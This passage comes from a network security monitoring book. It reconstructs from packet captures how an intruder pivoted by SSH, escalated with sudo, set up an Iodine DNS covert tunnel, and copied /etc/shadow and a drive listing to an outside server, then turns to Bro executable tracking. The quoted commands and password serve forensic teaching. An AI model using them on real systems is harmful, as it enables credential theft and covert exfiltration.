  id: totrans-1168
  prefs: []
  type: TYPE_NORMAL
- en: so intruder can retrieve more malicious software.
  id: totrans-1169
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  id: totrans-1170
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  id: totrans-1171
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-1172
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15
  id: totrans-1173
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  id: totrans-1174
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-17: A summary of stage 1 of the client-side compromise*'
  id: totrans-1175
  prefs: []
  type: TYPE_NORMAL
- en: '**256** Chapter 11'
  id: totrans-1176
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1177
  prefs: []
  type: TYPE_NORMAL
- en: '***Pivoting to a Second Victim***'
  id: totrans-1178
  prefs: []
  type: TYPE_NORMAL
- en: Next, as shown in Listing 11-21, it appears that the intruder is connecting
  id: totrans-1179
  prefs: []
  type: TYPE_NORMAL
- en: from the first victim, 172.16.0.37, via SSH as user ubu32 to a second victim,
  id: totrans-1180
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99\. This is followed by the login prompt on 10.0.0.99, another Linux
  id: totrans-1181
  prefs: []
  type: TYPE_NORMAL
- en: system that’s running the same kernel. It advertises itself as an Ubuntu
  id: totrans-1182
  prefs: []
  type: TYPE_NORMAL
- en: 12.0.4.2 LTS distribution.
  id: totrans-1183
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....21495256091063571385331835436694........2......'
  id: totrans-1184
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**ssh ubu32@10.0.0.99**'
  id: totrans-1185
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..U...........2...........4**Welcome to Ubuntu 12.04.2 LTS** (GNU/Linux
    3.5.0-25-generic i686) SRC:'
  id: totrans-1186
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: * Documentation: https://help.ubuntu.com/'
  id: totrans-1187
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  id: totrans-1188
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: 0 packages can be updated.'
  id: totrans-1189
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: 0 updates are security updates.'
  id: totrans-1190
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-21: Ubuntu connection to another victim*'
  id: totrans-1191
  prefs: []
  type: TYPE_NORMAL
- en: By running sudo bash, as shown in Listing 11-22, the intruder escalates
  id: totrans-1192
  prefs: []
  type: TYPE_NORMAL
- en: his access to root privileges.
  id: totrans-1193
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...v............core_channel_write....)....29459743353766825927232004106327........2......'
  id: totrans-1194
  prefs: []
  type: TYPE_NORMAL
- en: '.....4sudo bash'
  id: totrans-1195
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...........'
  id: totrans-1196
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-1197
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1198
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....29459743353766825927232004106327............'
  id: totrans-1199
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ............'
  id: totrans-1200
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ...w...........2...........4**sudo bash**'
  id: totrans-1201
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....UJUHVDEWIYIKWPCUMRTWODZUIDRXEMKG.'
  id: totrans-1202
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1203
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......#...4[sudo] password for ubu32: ....................core_channel_'
  id: totrans-1204
  prefs: []
  type: TYPE_NORMAL
- en: write....)....JTCKKYYZSXEFTWGOEWDZKWHCOLJYUWZG.
  id: totrans-1205
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...v............core_channel_write....)....56755805437825017718244048581240........2......'
  id: totrans-1206
  prefs: []
  type: TYPE_NORMAL
- en: '.....4wonderubu'
  id: totrans-1207
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-22: Access escalation with sudo bash*'
  id: totrans-1208
  prefs: []
  type: TYPE_NORMAL
- en: '***Instal ing a Covert Tunnel***'
  id: totrans-1209
  prefs: []
  type: TYPE_NORMAL
- en: As root, the intruder now installs the Iodine DNS covert tunnel tool via
  id: totrans-1210
  prefs: []
  type: TYPE_NORMAL
- en: dpkg -i iodine_0.6.0~rc1-7_i386.deb, as shown in Listing 11-23\.
  id: totrans-1211
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....64642638366982677090891088802167........2......'
  id: totrans-1212
  prefs: []
  type: TYPE_NORMAL
- en: .,...4**dpkg -i iodine_0.6.0~rc1-7_i386.deb**
  id: totrans-1213
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-23: Iodine DNS covert tunnel tool instal ation*'
  id: totrans-1214
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **257**
  id: totrans-1215
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1216
  prefs: []
  type: TYPE_NORMAL
- en: Next, we see that the intruder starts the Iodine tool with the command iodine
    -r 203.0.113.8 practicalnsm.com, as shown in Listing 11-24\. He is starting the
    Iodine client, pointing it to a server at 203.0.113.8, with DNS traffic
  id: totrans-1217
  prefs: []
  type: TYPE_NORMAL
- en: using the *practicalnsm.com* domain. (I wonder who caused this intrusion?)
  id: totrans-1218
  prefs: []
  type: TYPE_NORMAL
- en: Because the attacker initiates Iodine in this manner, it looks like the victim,
  id: totrans-1219
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99, will communicate directly with an Iodine server at 203.0.113.8\.
  id: totrans-1220
  prefs: []
  type: TYPE_NORMAL
- en: (There is no need to communicate with a DNS server when Iodine is run in
  id: totrans-1221
  prefs: []
  type: TYPE_NORMAL
- en: this manner, but the covert traffic will still appear as DNS.)
  id: totrans-1222
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....54112282595894012391779534721588........2......'
  id: totrans-1223
  prefs: []
  type: TYPE_NORMAL
- en: ./...4**iodine -r** **203.0.113.8 practicalnsm.com**
  id: totrans-1224
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-24: Iodine tool startup*'
  id: totrans-1225
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-25 likely shows output received from the Iodine server. We
  id: totrans-1226
  prefs: []
  type: TYPE_NORMAL
- en: see that the server IP address is 10.10.0.1, which tells us that there is a
    VPN
  id: totrans-1227
  prefs: []
  type: TYPE_NORMAL
- en: sort of channel between 10.0.0.99 and 203.0.113.8\. Now the two computers
  id: totrans-1228
  prefs: []
  type: TYPE_NORMAL
- en: can communicate with each other via IP addresses like 10.10.0.1 for the
  id: totrans-1229
  prefs: []
  type: TYPE_NORMAL
- en: server, rather than 203.0.113.8\. (The Iodine tool encapsulates the intruder’s
  id: totrans-1230
  prefs: []
  type: TYPE_NORMAL
- en: communications in DNS traffic.)
  id: totrans-1231
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....'
  id: totrans-1232
  prefs: []
  type: TYPE_NORMAL
- en: WXQSRQPTXGMIWNZFNDHOHWTCFEJDDKUF................2.......:...4**Server tunnel
    IP is 10.10.0.1**
  id: totrans-1233
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-25: Output from the Iodine server*'
  id: totrans-1234
  prefs: []
  type: TYPE_NORMAL
- en: To test connectivity, the intruder uses the ping utility to contact 10.10.0.1,
  id: totrans-1235
  prefs: []
  type: TYPE_NORMAL
- en: the IP address at the other end of the tunnel, as shown in Listing 11-26\. The
  id: totrans-1236
  prefs: []
  type: TYPE_NORMAL
- en: remote system replies, and the tunnel is working. An NSM sensor will not
  id: totrans-1237
  prefs: []
  type: TYPE_NORMAL
- en: see ICMP traffic, but it will start seeing odd DNS activity.
  id: totrans-1238
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ...............2...........4**ping -c** 3 **10.10.0.1**'
  id: totrans-1239
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....BGCEPMSGLBOFCPOHKXSKOAMVWVCRDKFU.'
  id: totrans-1240
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1241
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......:...4**PING 10.10.0.1 (10.10.0.1) 56(84) bytes of
    data.**'
  id: totrans-1242
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ...........2........core_channel_write....)....GSFTPZWPJXAREZEXEEALKFUBCUSRLPEK.'
  id: totrans-1243
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1244
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......A...464 bytes from 10.10.0.1: icmp_req=1 ttl=64
    time=2.07 ms SRC: ...........9........core_channel_write....)....MUNJGYKCWWYETWKFZOWTIVKVAQNLKNCQ.'
  id: totrans-1245
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1246
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......A...464 bytes from 10.10.0.1: icmp_req=2 ttl=64
    time=1.15 ms SRC: ...........9........core_channel_write....)....JLCWSBHPCCBTZFUVTJUYBYQVUOXEZPPF.'
  id: totrans-1247
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1248
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..Q...........2...........464 bytes from 10.10.0.1: icmp_req=3 ttl=64
    time=1.12 ms SRC:'
  id: totrans-1249
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: --- 10.10.0.1 ping statistics ---'
  id: totrans-1250
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: 3 packets transmitted, 3 received, 0% packet loss, time 2003ms'
  id: totrans-1251
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: rtt min/avg/max/mdev = 1.128/1.453/2.073/0.439 ms'
  id: totrans-1252
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-26: Ping test for tunnel connectivity*'
  id: totrans-1253
  prefs: []
  type: TYPE_NORMAL
- en: '**258** Chapter 11'
  id: totrans-1254
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1255
  prefs: []
  type: TYPE_NORMAL
- en: '***Enumerating the Victim***'
  id: totrans-1256
  prefs: []
  type: TYPE_NORMAL
- en: Now the intruder turns to enumerating the victim. He prints the output of
  id: totrans-1257
  prefs: []
  type: TYPE_NORMAL
- en: the */etc/shadow* file, which contains password hashes. Listing 11-27 shows
  id: totrans-1258
  prefs: []
  type: TYPE_NORMAL
- en: part of this file.
  id: totrans-1259
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: root@intubu32:~# ....................core_channel_write....)....'
  id: totrans-1260
  prefs: []
  type: TYPE_NORMAL
- en: LBTPOVHNRBVNFEXWLPWAAXXSYKEYJQMW.
  id: totrans-1261
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...|............core_channel_write....)....76703429583552950498014447957238........2......'
  id: totrans-1262
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**cat /etc/shadow**'
  id: totrans-1263
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ............'
  id: totrans-1264
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1265
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..d............core_channel_write....)....76703429583552950498014447957238...............'
  id: totrans-1266
  prefs: []
  type: TYPE_NORMAL
- en: '..........'
  id: totrans-1267
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ...............2...........4cat /etc/shadow'
  id: totrans-1268
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: root:!:15773:0:99999:7:::'
  id: totrans-1269
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: daemon:*:15749:0:99999:7:::'
  id: totrans-1270
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: bin:*:15749:0:99999:7:::'
  id: totrans-1271
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: sys:*:15749:0:99999:7:::'
  id: totrans-1272
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: sync:*:15749:0:99999:7:::'
  id: totrans-1273
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: games:*:15749:0:99999:7:::'
  id: totrans-1274
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: man:*:15749:0:99999:7:::'
  id: totrans-1275
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: lp:*:15749:0:99999:7:::'
  id: totrans-1276
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-27: Contents of the* /etc/shadow *file*'
  id: totrans-1277
  prefs: []
  type: TYPE_NORMAL
- en: As shown in Listing 11-28, the intruder uses scp to copy the */etc/shadow*
  id: totrans-1278
  prefs: []
  type: TYPE_NORMAL
- en: file to 10.10.0.1, the server on the other side of the Iodine covert channel.
  id: totrans-1279
  prefs: []
  type: TYPE_NORMAL
- en: He connects as user raybourque and copies the file to Ray’s home directory.
  id: totrans-1280
  prefs: []
  type: TYPE_NORMAL
- en: His password is Bru1ns. I like this guy. (Note that by using scp, the transfer
    is
  id: totrans-1281
  prefs: []
  type: TYPE_NORMAL
- en: encrypted within the DNS covert channel.)
  id: totrans-1282
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2.......@...4**scp /etc/shadow raybourque@10.10.0.1:/home/raybourque/**'
  id: totrans-1283
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...s............core_channel_write....)....12979532812626493965961252667084........2......'
  id: totrans-1284
  prefs: []
  type: TYPE_NORMAL
- en: '.....4**Bru1ns**'
  id: totrans-1285
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: **shadow** 100% 1121 1.1KB/s 00:00'
  id: totrans-1286
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-28: Copying the* /etc/shadow *file*'
  id: totrans-1287
  prefs: []
  type: TYPE_NORMAL
- en: The intruder next creates a recursive directory listing of the entire hard
  id: totrans-1288
  prefs: []
  type: TYPE_NORMAL
- en: drive and puts the contents in a file titled *intubu32.ls-alR.txt*, as shown
    in Listing 11-29\.
  id: totrans-1289
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ................core_channel_write....)....67917540968083609031577076644751........2....'
  id: totrans-1290
  prefs: []
  type: TYPE_NORMAL
- en: '...(...4**ls -alR / > intubu32.ls-alR.txt**'
  id: totrans-1291
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-29: Creating a recursive directory listing of the hard drive*'
  id: totrans-1292
  prefs: []
  type: TYPE_NORMAL
- en: After creating the file, the intruder again uses scp to transfer it to his
  id: totrans-1293
  prefs: []
  type: TYPE_NORMAL
- en: server as user raybourque, as shown in Listing 11-30\.
  id: totrans-1294
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **259**
  id: totrans-1295
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1296
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..............2...........4**scp intubu32.ls-alR.txt raybourque@10.10.0.1:/home/raybourque**
    **SRC: <32.ls-alR.txt** raybourque@10.10.0.1:/home/raybourque'
  id: totrans-1297
  prefs: []
  type: TYPE_NORMAL
- en: '........................./'
  id: totrans-1298
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ....................core_channel_write....)....USSCEEVDBIGFIRWOSESCHCUWSDAZFPJS.'
  id: totrans-1299
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: .'
  id: totrans-1300
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ..u...........2...........4Password:....................core_channel_write....)....'
  id: totrans-1301
  prefs: []
  type: TYPE_NORMAL
- en: GUTYMDXFGXQWFPYSCFKMNPZTQEKYHWYC.
  id: totrans-1302
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: ...s............core_channel_write....)....56606769242836968330355877691782........2......'
  id: totrans-1303
  prefs: []
  type: TYPE_NORMAL
- en: '.....4Bru1ns'
  id: totrans-1304
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-30: Transfer of hard drive file listing to intruder’s server*'
  id: totrans-1305
  prefs: []
  type: TYPE_NORMAL
- en: That’s the end of the transcript.
  id: totrans-1306
  prefs: []
  type: TYPE_NORMAL
- en: '***Summarizing Stage 2***'
  id: totrans-1307
  prefs: []
  type: TYPE_NORMAL
- en: In the second half of this intrusion, the intruder, still operating from
  id: totrans-1308
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15, used stolen credentials to connect via SSH from 172.16.0.37
  id: totrans-1309
  prefs: []
  type: TYPE_NORMAL
- en: to 10.0.0.9\. He copied a DNS covert tunnel tool to the second victim and
  id: totrans-1310
  prefs: []
  type: TYPE_NORMAL
- en: configured it to speak to a new intruder system at 203.0.113.8\. The intruder
  id: totrans-1311
  prefs: []
  type: TYPE_NORMAL
- en: activated the covert tunnel, and we saw that it communicated via DNS
  id: totrans-1312
  prefs: []
  type: TYPE_NORMAL
- en: requests and replies. Within the covert tunnel, the intruder copied sensitive
  id: totrans-1313
  prefs: []
  type: TYPE_NORMAL
- en: data enumerated from the second victim, 10.0.0.9\. Figure 11-18 summarizes
  id: totrans-1314
  prefs: []
  type: TYPE_NORMAL
- en: these actions.
  id: totrans-1315
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Intruder pivots from Victim 1 to Victim 2\.
  id: totrans-1316
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  id: totrans-1317
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 1
  id: totrans-1318
  prefs: []
  type: TYPE_NORMAL
- en: Victim 1
  id: totrans-1319
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15
  id: totrans-1320
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  id: totrans-1321
  prefs: []
  type: TYPE_NORMAL
- en: Victim 2
  id: totrans-1322
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99
  id: totrans-1323
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Intruder installs DNS covert tunnel tool and creates
  id: totrans-1324
  prefs: []
  type: TYPE_NORMAL
- en: channel to second intruder system (Intruder 2).
  id: totrans-1325
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  id: totrans-1326
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  id: totrans-1327
  prefs: []
  type: TYPE_NORMAL
- en: Victim 2
  id: totrans-1328
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.8
  id: totrans-1329
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99
  id: totrans-1330
  prefs: []
  type: TYPE_NORMAL
- en: 3\. Within covert tunnel, intruder copies sensitive
  id: totrans-1331
  prefs: []
  type: TYPE_NORMAL
- en: data from Victim 2 to Intruder 2\.
  id: totrans-1332
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION
  id: totrans-1333
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  id: totrans-1334
  prefs: []
  type: TYPE_NORMAL
- en: Victim 2
  id: totrans-1335
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.8
  id: totrans-1336
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99
  id: totrans-1337
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-18: A summary of stage 2 of the server-side compromise*'
  id: totrans-1338
  prefs: []
  type: TYPE_NORMAL
- en: '**260** Chapter 11'
  id: totrans-1339
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1340
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 145](index-295_1.jpg)'
  id: totrans-1341
  prefs: []
  type: TYPE_IMG
- en: '**conclusion**'
  id: totrans-1342
  prefs: []
  type: TYPE_NORMAL
- en: Our review of this chapter’s example showed that the intruder was very
  id: totrans-1343
  prefs: []
  type: TYPE_NORMAL
- en: active on the original victim, 172.16.0.37, and used information gathered
  id: totrans-1344
  prefs: []
  type: TYPE_NORMAL
- en: from that system to pivot to 10.0.0.99\. The initial review of NSM data out-
  id: totrans-1345
  prefs: []
  type: TYPE_NORMAL
- en: lined the broad story of the intrusion, but examining the command-and-
  id: totrans-1346
  prefs: []
  type: TYPE_NORMAL
- en: control channel helped fill in some blanks. Thanks to the NSM platform
  id: totrans-1347
  prefs: []
  type: TYPE_NORMAL
- en: capturing full packet data, the Vivian’s Pets CIRT knows what happened
  id: totrans-1348
  prefs: []
  type: TYPE_NORMAL
- en: to the two systems on its network.
  id: totrans-1349
  prefs: []
  type: TYPE_NORMAL
- en: This example of a client-side compromise began with an innocent
  id: totrans-1350
  prefs: []
  type: TYPE_NORMAL
- en: search on Twitter and concluded with two compromised machines and a
  id: totrans-1351
  prefs: []
  type: TYPE_NORMAL
- en: covert channel carrying sensitive information outside the company. Our
  id: totrans-1352
  prefs: []
  type: TYPE_NORMAL
- en: network-centric approach answered many questions about the course of the
  id: totrans-1353
  prefs: []
  type: TYPE_NORMAL
- en: intrusion, but it also showed that in some ways, the CIRT got lucky. If the
  id: totrans-1354
  prefs: []
  type: TYPE_NORMAL
- en: command-and-control channel between 203.0.113.15 and 172.16.0.37 had
  id: totrans-1355
  prefs: []
  type: TYPE_NORMAL
- en: been encrypted, the CIRT would not have learned critical details about
  id: totrans-1356
  prefs: []
  type: TYPE_NORMAL
- en: the intrusion. For that reason, it’s useful to have host-centric forensics and
  id: totrans-1357
  prefs: []
  type: TYPE_NORMAL
- en: investigation techniques ready if possible, but that’s a topic for someone
  id: totrans-1358
  prefs: []
  type: TYPE_NORMAL
- en: else’s book!
  id: totrans-1359
  prefs: []
  type: TYPE_NORMAL
- en: Speaking of Twitter, the analysts do have some information about
  id: totrans-1360
  prefs: []
  type: TYPE_NORMAL
- en: the source of the attack. Threat agents are humans who might make bad
  id: totrans-1361
  prefs: []
  type: TYPE_NORMAL
- en: choices. Defenders can sometimes capitalize on these bad choices to better
  id: totrans-1362
  prefs: []
  type: TYPE_NORMAL
- en: understand the threat and defend the network. In the case of this intrusion,
  id: totrans-1363
  prefs: []
  type: TYPE_NORMAL
- en: several hours after the covert channel died, the tweet shown in Figure 11-19
  id: totrans-1364
  prefs: []
  type: TYPE_NORMAL
- en: appeared. Pay attention to the bottom of the figure where the tweet’s text
  id: totrans-1365
  prefs: []
  type: TYPE_NORMAL
- en: appears.
  id: totrans-1366
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-19: Last tweet from* Callbackpnsm'
  id: totrans-1367
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **261**
  id: totrans-1368
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1369
  prefs: []
  type: TYPE_NORMAL
- en: This tweet is a combination of text and a picture. The tweet says
  id: totrans-1370
  prefs: []
  type: TYPE_NORMAL
- en: “@ubu32pnsm Thanks for checking out the healthcare update. One of
  id: totrans-1371
  prefs: []
  type: TYPE_NORMAL
- en: 'us is #winning. pic.twitter.com/mD4y6eIiqF.” The picture, shown in Fig-'
  id: totrans-1372
  prefs: []
  type: TYPE_NORMAL
- en: ure 11-19, appears to be a screen capture of an Ubuntu desktop; in fact, it
  id: totrans-1373
  prefs: []
  type: TYPE_NORMAL
- en: shows the victim user’s system. She is logged in to Twitter as user Ubu32pnsm.
  id: totrans-1374
  prefs: []
  type: TYPE_NORMAL
- en: Two Firefox browser tabs are open. The second tab shows part of the URL
  id: totrans-1375
  prefs: []
  type: TYPE_NORMAL
- en: for the phony *healthcarenews* website on 203.0.113.15\. This intruder thinks
  id: totrans-1376
  prefs: []
  type: TYPE_NORMAL
- en: he’s a funny guy, but personalized messages like this could be his undoing.
  id: totrans-1377
  prefs: []
  type: TYPE_NORMAL
- en: In order to not get caught, attackers also need to practice sound opera-
  id: totrans-1378
  prefs: []
  type: TYPE_NORMAL
- en: tional security.
  id: totrans-1379
  prefs: []
  type: TYPE_NORMAL
- en: '**262** Chapter 11'
  id: totrans-1380
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1381
  prefs: []
  type: TYPE_NORMAL
- en: '**12**'
  id: totrans-1382
  prefs: []
  type: TYPE_NORMAL
- en: '**e x T e N D i N g S o**'
  id: totrans-1383
  prefs: []
  type: TYPE_NORMAL
- en: So far, we’ve been working with the default
  id: totrans-1384
  prefs: []
  type: TYPE_NORMAL
- en: installation of SO. This chapter introduces
  id: totrans-1385
  prefs: []
  type: TYPE_NORMAL
- en: a few ways to extend it. You just need to edit
  id: totrans-1386
  prefs: []
  type: TYPE_NORMAL
- en: a few configuration files and download some
  id: totrans-1387
  prefs: []
  type: TYPE_NORMAL
- en: external content to get more from your SO setup.
  id: totrans-1388
  prefs: []
  type: TYPE_NORMAL
- en: To move beyond the “stock” SO installation, we’ll look at three ways to
  id: totrans-1389
  prefs: []
  type: TYPE_NORMAL
- en: 'leverage additional functionality provided by the Bro suite:'
  id: totrans-1390
  prefs: []
  type: TYPE_NORMAL
- en: • Use the MD5 hashes logged by Bro with the website VirusTotal or other
  id: totrans-1391
  prefs: []
  type: TYPE_NORMAL
- en: third-party analysis engines.
  id: totrans-1392
  prefs: []
  type: TYPE_NORMAL
- en: • Configure Bro to extract binaries from network traffic, so that you can
  id: totrans-1393
  prefs: []
  type: TYPE_NORMAL
- en: submit those artifacts to third-party analysis engines.
  id: totrans-1394
  prefs: []
  type: TYPE_NORMAL
- en: • Integrate external intelligence from Mandiant’s APT1 report with Bro
  id: totrans-1395
  prefs: []
  type: TYPE_NORMAL
- en: to generate alert data.
  id: totrans-1396
  prefs: []
  type: TYPE_NORMAL
- en: The chapter concludes with an example that shows how SO reports and
  id: totrans-1397
  prefs: []
  type: TYPE_NORMAL
- en: extracts the download of a malicious binary.
  id: totrans-1398
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1399
  prefs: []
  type: TYPE_NORMAL
- en: '**using bro to Track executables**'
  id: totrans-1400
  prefs: []
  type: TYPE_NORMAL
- en: When trying to defend an enterprise, CIRTs can benefit by knowing which
  id: totrans-1401
  prefs: []
  type: TYPE_NORMAL
- en: executables users are downloading over the network. Usually, these exe-
  id: totrans-1402
  prefs: []
  type: TYPE_NORMAL
- en: cutables are benign tools or packages that people need to do their jobs, but
  id: totrans-1403
  prefs: []
  type: TYPE_NORMAL
- en: sometimes they’re malicious software. Bro can help you to discover the sorts
  id: totrans-1404
  prefs: []
  type: TYPE_NORMAL
- en: of executables people are downloading in order to protect them from harm.
  id: totrans-1405
  prefs: []
  type: TYPE_NORMAL
- en: '***Hashing Downloaded Executables with Bro***'
  id: totrans-1406
  prefs: []
  type: TYPE_NORMAL
- en: By default, the version of Bro shipped with SO calculates an MD5 hash (a
  id: totrans-1407
  prefs: []
  type: TYPE_NORMAL
- en: cryptographic representation of a file’s contents) for every executable down-
  id: totrans-1408
  prefs: []
  type: TYPE_NORMAL
- en: loaded via HTTP. These hash values can help us track the executables
  id: totrans-1409
  prefs: []
  type: TYPE_NORMAL
- en: downloaded by users. For example, Listing 12-1 shows how Bro tracks execut-
  id: totrans-1410
  prefs: []
  type: TYPE_NORMAL
- en: able downloads. The *notice.log* file records data about hashes that Bro gener-
  id: totrans-1411
  prefs: []
  type: TYPE_NORMAL
- en: ates when it sees executables transferred over HTTP.
  id: totrans-1412
  prefs: []
  type: TYPE_NORMAL
- en: 2013-04-12T13:33:47+0000 mBNkJTlLBfa 192.168.2.108 49630 23.62.236.50 80
  id: totrans-1413
  prefs: []
  type: TYPE_NORMAL
- en: 1 GET download.cdn.mozilla.net /pub/mozilla.org/firefox/releases/20.0.1/
  id: totrans-1414
  prefs: []
  type: TYPE_NORMAL
- en: win32/en-US/Firefox Setup 20.0.1.exeu http://www.mozilla.org/en-US/products/download.
  id: totrans-1415
  prefs: []
  type: TYPE_NORMAL
- en: html?product=firefox-20.0&os=win&lang=en-US Mozilla/5.0 (Windows NT 6.1; WOW64;
    rv:19.0) Gecko/20100101 Firefox/19.0 0 21036128 200 OK - -
  id: totrans-1416
  prefs: []
  type: TYPE_NORMAL
- en: '- (empty) - -- application/x-dosexecv 1e39efe30b02fd96b10785b49e23913bw'
  id: totrans-1417
  prefs: []
  type: TYPE_NORMAL
- en: '-'
  id: totrans-1418
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 12-1: Bro* http .log *entry for download of Firefox binary*'
  id: totrans-1419
  prefs: []
  type: TYPE_NORMAL
- en: You can see the download of *Firefox Setup 20.0.1.exe* u, a file of type
  id: totrans-1420
  prefs: []
  type: TYPE_NORMAL
- en: application/x-dosexec v, with the hash 1e39efe30b02fd96b10785b49e23913b w.
  id: totrans-1421
  prefs: []
  type: TYPE_NORMAL
- en: By default, Bro reports when it hashes executables and writes an event to
  id: totrans-1422
  prefs: []
  type: TYPE_NORMAL
- en: the Bro *notice.log* file, as shown in Listing 12-2\.
  id: totrans-1423
  prefs: []
  type: TYPE_NORMAL
